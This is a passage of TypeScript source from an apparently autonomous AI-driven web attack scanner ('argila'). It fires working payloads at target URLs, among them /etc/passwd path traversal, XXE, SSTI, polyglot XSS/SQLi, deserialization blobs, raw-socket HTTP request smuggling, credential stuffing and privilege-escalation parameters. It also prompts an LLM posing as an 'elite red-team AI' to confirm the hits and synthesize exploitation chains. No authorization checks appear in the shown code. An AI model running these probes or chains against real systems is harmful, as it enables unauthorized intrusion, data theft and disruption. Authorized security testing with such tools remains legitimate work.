                'RCE': [/\buid=\d+\([\w-]+\)/i, /\bgid=\d+\([\w-]+\)/i, 'root:x:0:0:', 'www-data:x:', /\bbin\/bash\b/, /Linux \S+ \d+\.\d+/],
                'SSTI': ['>49<', '"value":49', '=49&', ': 49,', ': 49}', '7777777', '__class__', 'mro__', 'subclasses__'],
                'SSRF': ['ami-id', 'instance-id', 'computeMetadata', 'iam/security-credentials', 'metadata.google.internal'],
                'NoSQLi': ['CastError', 'ObjectId', 'MongoError:', 'BSON', 'unknown top level operator'],
              };
              
              const typeMarkers = errorMarkers[type] || [];
              const bodyLower = bodyStr.toLowerCase();
              const baselineLower = (baseline?.body || '').toLowerCase();
              const matchMarker = (m: string | RegExp): boolean => {
                if (m instanceof RegExp) {
                  return m.test(bodyStr) && !m.test(baseline?.body || '');
                }
                const ml = m.toLowerCase();
                // Marker must be NEW vs baseline — frameworks ship the
                // word 'config' and the string 'ObjectId' in their JS
                // bundles; only count it if the probe induced it.
                return bodyLower.includes(ml) && !baselineLower.includes(ml);
              };
              const hasTypeMarkers = typeMarkers.some(matchMarker);

              // Generic error words gated by baseline-diff: 'error' /
              // 'exception' / 'stack trace' all appear in benign React
              // bundles and JSON copy. Only count NEW occurrences.
              const genericErrorRe = /\b(?:error|exception|stack trace|stacktrace|traceback|fatal error)\b/i;
              const hasGenericError = genericErrorRe.test(bodyStr) && !genericErrorRe.test(baseline?.body || '');

              // Verification trigger: need at least one indicator
              if (ai && (isStatusDiff || isLatencySpike || hasTypeMarkers || (hasGenericError && isStatusDiff))) {
                const analysisPrompt = `As an autonomous security agent (argila), analyze this HTTP interaction on ${hostname} to find the exact security gap.
                Target URL: ${testUrl}
                Payload: ${customPayload}
                Vulnerability Type: ${type}
                Response Status: ${res.status} (baseline: ${baseline?.status || 'unknown'})
                Response Latency: ${latency}ms
                Response Body (truncated): ${bodyStr.substring(0, 2000)}
                Matched Indicators: ${hasTypeMarkers ? 'type-specific markers found' : ''} ${isLatencySpike ? 'timing anomaly' : ''} ${isStatusDiff ? 'status code change' : ''}
                
                [CONTEXT]: Tech: ${memory.tech.join(', ')} | Users: ${memory.discoveredUsers.join(', ')} | Findings: ${JSON.stringify(memory.findings)}
                
                Determine if this is a REAL ${type} vulnerability. Reject false positives (generic error pages, WAF blocks, rate limits).
                Can this be chained with previous findings for escalation?
                Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

                const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
                if (analysis.isVulnerable && analysis.confidence > 0.8) {
                  this.log(jobId, 'vuln', `CONFIRMED ${type}: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential, payload: customPayload });
                  const finding = { 
                    endpoint: ep.url, type, payload: customPayload, 
                    gap: analysis.gap_identified, evidence: analysis.explanation, chain: analysis.chain_potential
                  };
                  vulnerabilities.push(finding);
                  MemoryManager.addFinding(jobId, hostname, finding);
                }
              }
            } catch {}
          }
        }

        this.log(jobId, 'info', `Phase 4 fuzzing complete: ${vulnerabilities.length} vulnerability(ies) confirmed across ${prioritizedEndpoints.length} endpoints`);

        // --- PoC Generation (hardened with safe JSON parse) ---
        if (ai && vulnerabilities.length > 0) {
          const pocPrompt = `Generate a detailed Proof of Concept (PoC) for these confirmed vulnerabilities: ${JSON.stringify(vulnerabilities.slice(0, 10))}. 
          Target: ${targetUrl}. 
          Include: 1. Description, 2. Steps to Reproduce (curl/browser), 3. Impact (CIA triad), 4. Remediation.
          Format: JSON { "pocs": [ { "title": string, "steps": string[], "impact": string, "remediation": string, "severity": string } ] }`;
          
          const pocData = safeJsonParse<{ pocs: any[] }>(await ai.generate(pocPrompt, true), { pocs: [] });
          if (pocData.pocs.length > 0) {
            allFindings.push({ phase: 'Phase 4', type: 'AI PoC Reports', data: pocData.pocs });
          }
        }

        // --- PHASE 4d: AUTONOMOUS 0DAY DISCOVERY ---
        this.log(jobId, 'info', 'Phase 4d: Autonomous 0day Discovery');

        const zerodayTargets = prioritizedEndpoints.slice(0, 30);

        // 4d-1: Behavioral Anomaly Fuzzing — edge-case inputs that trigger parser bugs
        this.log(jobId, 'info', 'Phase 4d-1: Behavioral Anomaly Fuzzing');
        // Markers must be probe-specific evidence — not generic English
        // words that occur naturally in API responses, JS bundles, or HTML
        // copy. Older versions matched 'error', 'exception', 'stack',
        // 'overflow', 'range', 'index', 'bound', 'format', 'NaN',
        // 'Infinity', 'alert' — each of those fired on legitimate React
        // error pages, JSON field names, or framework copy. Each marker
        // here should be a string we'd not expect in a clean baseline.
        const anomalyProbes: { name: string; value: string; markers: string[] }[] = [
          { name: 'Overlong UTF-8', value: '%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd', markers: ['root:x:0:0:', 'daemon:x:', '/bin/bash', '/bin/sh', '/sbin/nologin'] },
          { name: 'Null byte injection', value: 'test%00.html', markers: ['NUL byte', 'null byte', 'ENOENT', 'unexpected null'] },
          { name: 'Format string', value: '%s%s%s%s%s%s%s%s%s%s%n%n%n%n', markers: ['SIGSEGV', 'segmentation fault', 'core dumped'] },
          { name: 'Integer overflow', value: '99999999999999999999999999999999', markers: ['integer overflow', 'numeric overflow', 'out of range for int', 'value too large'] },
          { name: 'Negative index', value: '-1', markers: ['IndexOutOfBoundsException', 'index out of range', 'array bounds', 'ArrayIndexOutOfBounds'] },
          { name: 'Prototype pollution', value: '__proto__[isAdmin]=true', markers: ['__proto__', '"isAdmin":true'] },
          { name: 'Proto pollution JSON', value: '{"__proto__":{"isAdmin":true}}', markers: ['__proto__', '"isAdmin":true'] },
          { name: 'Java deserialization', value: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA', markers: ['java.io.', 'ClassNotFoundException', 'ObjectInputStream.readObject', 'java.lang.reflect'] },
          { name: 'PHP object injection', value: 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}', markers: ['unserialize():', 'Object of class', '__wakeup', '__destruct', 'PHP Fatal'] },
          { name: 'CRLF injection', value: 'test%0d%0aInjected-Header:%20true', markers: ['Injected-Header', 'injected-header'] },
          { name: 'Unicode normalization', value: '\u{FF0E}\u{FF0E}/\u{FF0E}\u{FF0E}/etc/passwd', markers: ['root:x:0:0:', 'daemon:x:', '/bin/bash'] },
          { name: 'Template expression', value: '${7*7}{{7*7}}<%= 7*7 %>${{7*7}}#{7*7}', markers: ['>49<', '"value":49', '=49&', ': 49,', ': 49}'] },
          // Target /etc/passwd (deterministic shape) instead of /etc/hostname
          // (free-form value we couldn't match without knowing it ahead of
          // time). 'root:x:0:0:' / 'daemon:x:' catch successful external-
          // entity expansion; 'XML parse error' / 'ParseError' / 'External
          // entity' catch the parser-error-leak case where the server
          // failed to disable entities and complained.
          { name: 'XML entity', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', markers: ['root:x:0:0:', 'daemon:x:', 'XML parse error', 'External entity', 'ParseError', 'lookupSystemId'] },
          { name: 'GraphQL introspection', value: '{"query":"{__schema{types{name}}}"}', markers: ['__schema', '__type', 'queryType', '"types":[{"name"'] },
          { name: 'Polyglot XSS/SQLi', value: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", markers: ['oNcliCk=alert()', 'oNloAd=alert()', '<sVg', 'jaVasCript:'] },
        ];

        // Fetch baseline for anomaly comparison. We keep a (truncated) copy
        // of the baseline body too, so each marker hit can be checked
        // against the baseline — if a marker was already present in the
        // clean response, the probe didn't induce it.
        const anomalyBaselines = new Map<string, { status: number; length: number; latency: number; body: string }>();
        for (const ep of zerodayTargets.slice(0, 15)) {
          try {
            const start = Date.now();
            const res = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
            const baseBody = (typeof res.data === 'string' ? res.data : JSON.stringify(res.data));
            anomalyBaselines.set(ep.url, {
              status: res.status,
              length: baseBody.length,
              latency: Date.now() - start,
              body: baseBody.slice(0, 200_000),
            });
          } catch {}
        }

        let anomalyCount = 0;
        for (const ep of zerodayTargets.slice(0, 15)) {
          if (anomalyCount >= 10) break;
          const baseline = anomalyBaselines.get(ep.url);
          if (!baseline) continue;

          for (const probe of anomalyProbes) {
            try {
              const separator = ep.url.includes('?') ? '&' : '?';
              const testUrl = `${ep.url}${separator}zd=${encodeURIComponent(probe.value)}`;

              const start = Date.now();
              const res = await axios.get(testUrl, { timeout: 8000, validateStatus: () => true });
              const latency = Date.now() - start;
              const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
              const bodyLen = bodyStr.length;

              const statusShift = res.status !== baseline.status;
              const sizeAnomaly = Math.abs(bodyLen - baseline.length) > baseline.length * 0.5 && bodyLen > 200;
              const latencySpike = latency > baseline.latency * 3 && latency > 2000;

              // A marker only counts if the probe *introduced* it — it must
              // be present now AND absent from the clean baseline. Without
              // this check, any marker that's just part of the page (a
              // JSON field literally named "index", an inline JS bundle
              // shipping the word "exception" in error-handling code, the
              // word "format" in user-facing copy) is reported as a 0day.
              const lowerBody = bodyStr.toLowerCase();
              const lowerBase = baseline.body.toLowerCase();
              const newMarkers = probe.markers.filter(m => {
                const ml = m.toLowerCase();
                return lowerBody.includes(ml) && !lowerBase.includes(ml);
              });
              const markerHit = newMarkers.length > 0;

              // Three layers of error-leak detection. All three require the
              // signal to be NEW vs the clean baseline — the word 'exception'
              // appearing in a minified JS bundle's error-handling code, or
              // 'fatal' in user-facing copy, or even 'ORA-' in
              // documentation, is not a leak unless the probe induced it.
              //   1. Stack-trace shape (file:line patterns) — strongest.
              //   2. Database error shape (Oracle/MySQL/Postgres/MS-SQL/
              //      Mongo/Redis surface specific error prefixes/types).
              //   3. Generic crash keywords as a fallback. Looser, but
              //      gated by the baseline diff so we don't lose
              //      sensitivity to single-line panics like
              //      'FATAL: connection to ... failed'.
              const traceShapeRe = /Traceback \(most recent call last\)|at \w[\w.$]*\([^)]*\.(?:js|ts|jsx|tsx|py|rb|php|java):\d+:\d+\)|\.(?:java|py|rb|php):\d+(?::in `|: in)|java\.lang\.[A-Z]\w*Exception:|java\.io\.[A-Z]\w*Exception:|PHP (?:Fatal|Warning|Notice|Parse) error:.{1,200}on line \d+|\sat \w[\w.$<>]*\([^)]+:\d+\)/;
              const dbErrorShapeRe = /ORA-\d{4,5}\b|MySQL server version|ERROR \d+ \([0-9A-Z]{5}\):|SQLSTATE\[[0-9A-Z]+\]|psycopg2\.\w+Error|pg::\w+Error|MongoError:|Microsoft OLE DB Provider|System\.Data\.SqlClient\.SqlException|Unclosed quotation mark after the character string|You have an error in your SQL syntax|Warning: pg_\w+|Warning: mysql\w*_/i;
              const genericCrashRe = /\b(?:exception|stacktrace|traceback|fatal error|kernel panic|segmentation fault|core dumped|syntax error near|unexpected token|undefined symbol|null pointer dereference|use after free)\b/i;

              const probeHasTrace = traceShapeRe.test(bodyStr);
              const probeHasDbErr = dbErrorShapeRe.test(bodyStr);
              const probeHasGeneric = genericCrashRe.test(bodyStr);
              const baseHasTrace = traceShapeRe.test(baseline.body);
              const baseHasDbErr = dbErrorShapeRe.test(baseline.body);
              const baseHasGeneric = genericCrashRe.test(baseline.body);

              const errorLeak =
                (probeHasTrace && !baseHasTrace) ||
                (probeHasDbErr && !baseHasDbErr) ||
                (probeHasGeneric && !baseHasGeneric);

              // Server crash (status went 5xx vs a non-5xx baseline) is
              // strong on its own. Otherwise we need at least two pieces
              // of corroborating evidence — a NEW marker plus structural
              // change (size, latency, or status). Marker alone is too
              // weak: even tightened, occasional FPs slip through and
              // the AI filter can't catch them all when LLM analysis is
              // skipped.
              const serverCrash = baseline.status < 500 && res.status >= 500;
              const corroborated =
                (markerHit && (statusShift || sizeAnomaly || latencySpike)) ||
                errorLeak ||
                (sizeAnomaly && latencySpike);

              if (serverCrash || corroborated) {
                const evidence: string[] = [];
                if (statusShift) evidence.push(`Status shift: ${baseline.status} → ${res.status}`);
                if (sizeAnomaly) evidence.push(`Size anomaly: ${baseline.length} → ${bodyLen}`);
                if (latencySpike) evidence.push(`Latency spike: ${baseline.latency}ms → ${latency}ms`);
                if (markerHit) evidence.push(`Marker hit (new vs baseline): ${newMarkers.join(', ')}`);
                if (errorLeak) evidence.push(`Stack-trace-shaped leak (new vs baseline)`);

                if (ai) {
                  const analysisPrompt = `As an elite security researcher, analyze this behavioral anomaly for potential 0day vulnerability.

Endpoint: ${ep.url}
Probe Type: ${probe.name}
Probe Value: ${probe.value}
Evidence: ${evidence.join(' | ')}
Response Status: ${res.status}
Response Body Snippet: ${bodyStr.substring(0, 2000)}
Baseline: Status ${baseline.status}, Size ${baseline.length}, Latency ${baseline.latency}ms
Tech Stack: ${discoveredInfo.identifiers ? JSON.stringify(discoveredInfo.identifiers) : 'unknown'}

Determine if this anomaly indicates a real exploitable vulnerability (potential 0day).
Consider: parser differential, memory corruption indicators, deserialization, injection bypass, access control failure.
Rate severity: CRITICAL (RCE/data breach), HIGH (auth bypass/info leak), MEDIUM (DoS/limited impact).
Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null, "severity": string, "cve_similar": string | null }`;

                  const analysis = safeJsonParse<AiVulnResult & { severity?: string; cve_similar?: string | null }>(
                    await ai.generate(analysisPrompt, true), { ...NULL_VULN, severity: 'UNKNOWN', cve_similar: null }
                  );

                  if (analysis.isVulnerable && analysis.confidence > 0.7) {
                    this.log(jobId, 'vuln', `0DAY CANDIDATE [${probe.name}]: ${analysis.gap_identified}`, {
                      endpoint: ep.url, probe: probe.name, evidence, severity: analysis.severity,
                      explanation: analysis.explanation, chain: analysis.chain_potential, cve_similar: analysis.cve_similar
                    });
                    MemoryManager.addFinding(jobId, hostname, {
                      type: '0day Candidate', endpoint: ep.url, probe: probe.name,
                      gap: analysis.gap_identified, chain_potential: analysis.chain_potential,
                      evidence, severity: analysis.severity
                    });
                    anomalyCount++;
                  }
                } else {
                  this.log(jobId, 'vuln', `BEHAVIORAL ANOMALY [${probe.name}]: ${ep.url}`, { evidence });
                  MemoryManager.addFinding(jobId, hostname, {
                    type: '0day Candidate', endpoint: ep.url, probe: probe.name,
                    gap: `Behavioral anomaly: ${evidence.join('; ')}`, chain_potential: null, evidence
                  });
                  anomalyCount++;
                }
              }
            } catch {}
          }
        }
        this.log(jobId, 'info', `Phase 4d-1 complete: ${anomalyCount} behavioral anomaly(ies) flagged`);

        // 4d-2: Differential Response Analysis — semantically equivalent requests, structural differences
        this.log(jobId, 'info', 'Phase 4d-2: Differential Response Analysis');
        let diffCount = 0;
        for (const ep of zerodayTargets.slice(0, 10)) {
          if (diffCount >= 5) break;
          try {
            // 'Case variation' is intentionally narrow now: most real
            // servers are case-sensitive on path matching, so an
            // uppercased URL produces 404 (or completely different
            // routes) on a benign target — the old `accessEscalation
            // || (statusDiff && contentDiff)` then flagged the 404
            // page as a parser differential. We mark it `escalationOnly`
            // so the ground-truth check below requires a 403 → 200
            // transition, not just any status difference.
            const variants: { name: string; url: string; escalationOnly?: boolean }[] = [
              { name: 'Case variation', url: ep.url.replace(/\/([a-z])/g, (_, c: string) => `/${c.toUpperCase()}`), escalationOnly: true },
              { name: 'Trailing dot', url: ep.url.replace(/(https?:\/\/[^/]+)/, '$1.') },
              { name: 'Double slash', url: ep.url.replace(/(https?:\/\/[^/]+)(\/.*)?$/, '$1/$2') },
              { name: 'Tab in path', url: ep.url.replace(/\/([^/]+)$/, '/\t$1') },
              { name: 'Semicolon path', url: ep.url.replace(/\/([^/]+)$/, '/;$1') },
              { name: 'URL-encoded slash', url: ep.url.replace(/\/([^/]+)$/, '%2f$1') },
            ];

            const baseRes = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true }).catch(() => null);
            if (!baseRes) continue;

            const baseBody = typeof baseRes.data === 'string' ? baseRes.data : JSON.stringify(baseRes.data);

            for (const variant of variants) {
              try {
                const varRes = await axios.get(variant.url, { timeout: 5000, validateStatus: () => true });
                const varBody = typeof varRes.data === 'string' ? varRes.data : JSON.stringify(varRes.data);

                const statusDiff = baseRes.status !== varRes.status;
                const accessEscalation = baseRes.status === 403 && varRes.status === 200;
                const contentDiff = baseBody !== varBody && Math.abs(baseBody.length - varBody.length) > 100;

                // Variants flagged as escalationOnly (e.g. case variation
                // on case-sensitive servers) require a 403 → 200
                // transition; bare statusDiff+contentDiff is insufficient
                // because case-sensitive routes legitimately return
                // different content for /Foo vs /foo without any
                // bypass involved.
                const isHit = variant.escalationOnly
                  ? accessEscalation
                  : (accessEscalation || (statusDiff && contentDiff));

                if (isHit) {
                  this.log(jobId, 'vuln', `DIFFERENTIAL ANOMALY [${variant.name}]: ${ep.url}`, {
                    original: { status: baseRes.status, length: baseBody.length },
                    variant: { status: varRes.status, length: varBody.length, url: variant.url },
                    accessEscalation
                  });

                  if (ai) {
                    const diffPrompt = `Analyze this differential response anomaly for access control bypass or parser differential vulnerability.

Original URL: ${ep.url} → Status ${baseRes.status}, Body size ${baseBody.length}
Variant URL (${variant.name}): ${variant.url} → Status ${varRes.status}, Body size ${varBody.length}
${accessEscalation ? 'ACCESS ESCALATION DETECTED: 403 → 200' : ''}
Original body snippet: ${baseBody.substring(0, 500)}
Variant body snippet: ${varBody.substring(0, 500)}

Is this a real access control bypass or parser differential vulnerability?
Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

                    const analysis = safeJsonParse<AiVulnResult>(await ai.generate(diffPrompt, true), NULL_VULN);
                    if (analysis.isVulnerable && analysis.confidence > 0.7) {
                      MemoryManager.addFinding(jobId, hostname, {
                        type: '0day Candidate', subtype: 'Parser Differential',
                        endpoint: ep.url, variant: variant.url, technique: variant.name,
                        gap: analysis.gap_identified, chain_potential: analysis.chain_potential,
                        accessEscalation
                      });
                      diffCount++;
                    }
                  } else if (accessEscalation) {
                    MemoryManager.addFinding(jobId, hostname, {
                      type: '0day Candidate', subtype: 'Access Control Bypass',
                      endpoint: ep.url, variant: variant.url, technique: variant.name,
                      gap: `403→200 via ${variant.name}`, chain_potential: 'Direct unauthorized access'
                    });
                    diffCount++;
                  }
                }
              } catch {}
            }
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4d-2 complete: ${diffCount} differential anomaly(ies) found`);

        // 4d-3: HTTP Request Smuggling Detection (raw TCP sockets to bypass Node.js re-chunking)
        this.log(jobId, 'info', 'Phase 4d-3: HTTP Request Smuggling Detection');
        let smuggleCount = 0;

        const rawHttpRequest = (host: string, port: number, useTls: boolean, rawPayload: string, timeoutMs: number = 8000): Promise<string> => {
          return new Promise((resolve) => {
            let response = '';
            const onData = (data: Buffer) => { response += data.toString(); };
            const onEnd = () => resolve(response);
            const onError = () => resolve('');
            const onTimeout = () => { socket.destroy(); resolve(response || ''); };

            let socket: net.Socket | tls.TLSSocket;
            if (useTls) {
              socket = tls.connect({ host, port, rejectUnauthorized: false }, () => socket.write(rawPayload));
            } else {
              socket = net.createConnection({ host, port }, () => socket.write(rawPayload));
            }
            socket.setTimeout(timeoutMs);
            socket.on('data', onData);
            socket.on('end', onEnd);
            socket.on('error', onError);
            socket.on('timeout', onTimeout);
          });
        };

        for (const asset of discoveredAssets.slice(0, 5)) {
          if (smuggleCount >= 3) break;
          try {
            const parsed = new URL(asset);
            const host = parsed.hostname;
            const useTls = parsed.protocol === 'https:';
            const port = parsed.port ? parseInt(parsed.port) : (useTls ? 443 : 80);

            // CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
            const cltePayload = `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX`;
            const clteResponse = await rawHttpRequest(host, port, useTls, cltePayload);

            // TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
            const teclPayload = `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n`;
            const teclResponse = await rawHttpRequest(host, port, useTls, teclPayload);

            // Extract status codes from raw responses
            const clteStatus = clteResponse.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1] || '';
            const teclStatus = teclResponse.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1] || '';

            // Strong smuggling indicators: look for desync evidence, not just status diffs
            const hasGPOST = /GPOST|unrecognized method|invalid method/i.test(teclResponse);
            const hasTimeout = clteResponse === '' && teclResponse !== '';
            const hasDesync = (clteStatus === '400' && teclStatus !== '400') || (teclStatus === '400' && clteStatus !== '400');
            const strongIndicator = hasGPOST || hasTimeout || (hasDesync && /smuggl|chunk|transfer/i.test(clteResponse + teclResponse));

            if (strongIndicator) {
              const evidence = [];
              if (hasGPOST) evidence.push('GPOST method reflected in response');
              if (hasTimeout) evidence.push('CL.TE timeout (potential desync)');
              if (hasDesync) evidence.push(`Status desync: CL.TE=${clteStatus}, TE.CL=${teclStatus}`);

              this.log(jobId, 'vuln', `HTTP SMUGGLING INDICATOR on ${asset}`, {
                clte: { status: clteStatus, body: clteResponse.substring(0, 300) },
                tecl: { status: teclStatus, body: teclResponse.substring(0, 300) },
                evidence,
              });

              if (ai) {
                const smugglePrompt = `Analyze these HTTP request smuggling test results for ${asset}.

CL.TE raw response: ${clteResponse.substring(0, 500)}
TE.CL raw response: ${teclResponse.substring(0, 500)}
Evidence: ${evidence.join(' | ')}

These were sent as raw TCP payloads (no HTTP library normalization).
Determine if this indicates a real HTTP request smuggling vulnerability.
Consider CL.TE, TE.CL, and TE.TE variants. Look for response desync indicators.
Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

                const analysis = safeJsonParse<AiVulnResult>(await ai.generate(smugglePrompt, true), NULL_VULN);
                if (analysis.isVulnerable && analysis.confidence > 0.6) {
                  MemoryManager.addFinding(jobId, hostname, {
                    type: '0day Candidate', subtype: 'HTTP Request Smuggling',
                    endpoint: asset, gap: analysis.gap_identified,
                    chain_potential: analysis.chain_potential || 'Cache poisoning, request hijacking, auth bypass'
                  });
                  smuggleCount++;
                }
              }
              // No AI fallback: only record if we have the strongest indicator (GPOST reflection)
              else if (hasGPOST) {
                MemoryManager.addFinding(jobId, hostname, {
                  type: '0day Candidate', subtype: 'HTTP Request Smuggling',
                  endpoint: asset, gap: 'GPOST method reflected — request smuggling desync confirmed',
                  chain_potential: 'Cache poisoning, request hijacking, auth bypass'
                });
                smuggleCount++;
              }
            }

            // HTTP/2 downgrade detection
            try {
              const h2Res = await axios.get(asset, {
                timeout: 5000, validateStatus: () => true,
                headers: { 'Connection': 'Upgrade, HTTP2-Settings', 'Upgrade': 'h2c', 'HTTP2-Settings': 'AAMAAABkAAQAAP__' },
              });
              if (h2Res.status === 101 || (h2Res.headers['upgrade'] || '').includes('h2c')) {
                this.log(jobId, 'vuln', `H2C SMUGGLING POSSIBLE on ${asset}`);
                MemoryManager.addFinding(jobId, hostname, {
                  type: '0day Candidate', subtype: 'H2C Smuggling',
                  endpoint: asset, gap: 'Server accepts h2c upgrade — HTTP/2 cleartext smuggling possible',
                  chain_potential: 'Bypass reverse proxy auth, access internal endpoints'
                });
                smuggleCount++;
              }
            } catch {}
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4d-3 complete: ${smuggleCount} smuggling indicator(s) found`);

        // 4d-4: AI-Driven 0day Chain Synthesis — correlate all findings for novel attack chains
        if (ai) {
          this.log(jobId, 'info', 'Phase 4d-4: AI-Driven 0day Chain Synthesis');
          const memory = MemoryManager.getMemory(jobId, hostname);
          const allFindingsSummary = memory.findings.slice(-30).map((f: Record<string, unknown>) => ({
            type: f.type, endpoint: f.endpoint || f.asset, gap: f.gap, chain: f.chain_potential
          }));

          if (allFindingsSummary.length >= 2) {
            const chainPrompt = `You are an elite autonomous red-team AI (argila). Analyze all discovered findings for this target and synthesize novel 0day attack chains.

Target: ${targetUrl}
Tech Stack: ${JSON.stringify(discoveredInfo)}
Total Findings: ${allFindingsSummary.length}

Findings Summary:
${JSON.stringify(allFindingsSummary, null, 2)}

Your task:
1. Identify findings that can be CHAINED together to create a higher-impact exploit (e.g., CORS + SSRF = internal service access; open redirect + JWT weakness = token theft)
2. Look for novel combinations that wouldn't be caught by standard scanners
3. Propose attack chains with step-by-step exploitation paths
4. Rate each chain's severity and feasibility

Return JSON: { "chains": [ { "name": string, "steps": string[], "findings_used": string[], "severity": "CRITICAL"|"HIGH"|"MEDIUM", "feasibility": number, "impact": string, "novelty": string } ] }`;

            const chainResult = safeJsonParse<{ chains: { name: string; steps: string[]; findings_used: string[]; severity: string; feasibility: number; impact: string; novelty: string }[] }>(
              await ai.generate(chainPrompt, true), { chains: [] }
            );

            for (const chain of chainResult.chains.filter(c => c.feasibility > 0.6)) {
              this.log(jobId, 'vuln', `0DAY CHAIN [${chain.severity}]: ${chain.name}`, {
                steps: chain.steps, findings_used: chain.findings_used,
                impact: chain.impact, novelty: chain.novelty, feasibility: chain.feasibility
              });
              MemoryManager.addFinding(jobId, hostname, {
                type: '0day Chain', name: chain.name, steps: chain.steps,
                findings_used: chain.findings_used, severity: chain.severity,
                gap: chain.impact, chain_potential: chain.novelty
              });
            }
            this.log(jobId, 'info', `Phase 4d-4 complete: ${chainResult.chains.filter(c => c.feasibility > 0.6).length} viable chain(s) synthesized`);
          } else {
            this.log(jobId, 'info', 'Phase 4d-4: Insufficient findings for chain synthesis (need 2+)');
          }
        }

        // Collect all Phase 4d findings into allFindings for the final report
        const phase4dMemory = MemoryManager.getMemory(jobId, hostname);
        const phase4dFindings = phase4dMemory.findings.filter((f: Record<string, unknown>) => f.type === '0day Candidate' || f.type === '0day Chain');
        if (phase4dFindings.length > 0) {
          allFindings.push({ phase: 'Phase 4d', type: '0day Discovery Results', data: phase4dFindings });
          vulnerabilities.push(...phase4dFindings.map((f: Record<string, unknown>) => ({
            type: f.type, endpoint: f.endpoint || f.asset, gap: f.gap,
            severity: f.severity || 'HIGH', phase: 'Phase 4d'
          })));
        }
        this.log(jobId, 'info', `Phase 4d complete: ${phase4dFindings.length} 0day finding(s) added to report`);

        // --- PHASE 4e: USER AND ENTITY BEHAVIOR ANALYTICS (UEBA) ---
        this.log(jobId, 'info', 'Phase 4e: User & Entity Behavior Analytics (UEBA)');
        this.updateJob(jobId, 'running', 'Phase 4e: UEBA');

        // 4e-1: Build behavioral baselines from observed traffic patterns
        this.log(jobId, 'info', 'Phase 4e-1: Building behavioral baselines');
        const uebaEndpoints = prioritizedEndpoints.slice(0, 20);
        const behaviorBaselines = new Map<string, {
          avgLatency: number; avgSize: number; statusCode: number;
          headerFingerprint: string; cookieNames: string[];
          contentType: string; serverHeader: string;
        }>();

        for (const ep of uebaEndpoints) {
          try {
            const samples: { latency: number; size: number; status: number }[] = [];
            let headerFp = '';
            let cookies: string[] = [];
            let contentType = '';
            let serverHeader = '';

            // Take 3 baseline samples per endpoint for statistical reliability
            for (let i = 0; i < 3; i++) {
              const start = Date.now();
              const res = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
              const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
              samples.push({ latency: Date.now() - start, size: bodyStr.length, status: res.status });

              if (i === 0) {
                headerFp = Object.keys(res.headers).sort().join(',');
                cookies = (res.headers['set-cookie'] || []).map((c: string) => c.split('=')[0]);
                contentType = String(res.headers['content-type'] || '').split(';')[0];
                serverHeader = String(res.headers['server'] || '');
              }
              if (i < 2) await delay(200);
            }

            const avgLatency = samples.reduce((s, x) => s + x.latency, 0) / samples.length;
            const avgSize = samples.reduce((s, x) => s + x.size, 0) / samples.length;

            behaviorBaselines.set(ep.url, {
              avgLatency, avgSize, statusCode: samples[0].status,
              headerFingerprint: headerFp, cookieNames: cookies,
              contentType, serverHeader,
            });
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4e-1 complete: ${behaviorBaselines.size} endpoint baselines established`);

        // 4e-2: Detect low-and-slow behavioral anomalies
        this.log(jobId, 'info', 'Phase 4e-2: Low-and-slow attack pattern detection');
        let uebaCount = 0;
        const lowSlowProbes: { name: string; method: string; transform: (url: string) => { url: string; headers?: Record<string, string>; data?: string } }[] = [
          {
            name: 'Credential stuffing pattern',
            method: 'POST',
            transform: (url) => ({
              url, headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              data: 'username=admin&password=test123'
            }),
          },
          {
            name: 'Session fixation probe',
            method: 'GET',
            transform: (url) => ({
              url, headers: { 'Cookie': 'session=fixated_session_id_12345; JSESSIONID=attacker_controlled' },
            }),
          },
          {
            name: 'Privilege escalation via role param',
            method: 'GET',
            transform: (url) => {
              const sep = url.includes('?') ? '&' : '?';
              return { url: `${url}${sep}role=admin&is_admin=1&privilege=superuser&access_level=9` };
            },
          },
          {
            name: 'Enumeration cadence detection',
            method: 'GET',
            transform: (url) => {
              const sep = url.includes('?') ? '&' : '?';
              return { url: `${url}${sep}id=1` };
            },
          },
          {
            name: 'API abuse — rate boundary',
            method: 'GET',
            transform: (url) => {
              const sep = url.includes('?') ? '&' : '?';
              return { url: `${url}${sep}limit=999999&offset=0&page=1` };
            },
          },
          {
            name: 'Insider data exfil — bulk export',
            method: 'GET',
            transform: (url) => {
              const sep = url.includes('?') ? '&' : '?';
              return { url: `${url}${sep}export=csv&format=json&download=all&dump=true` };
            },
          },
        ];

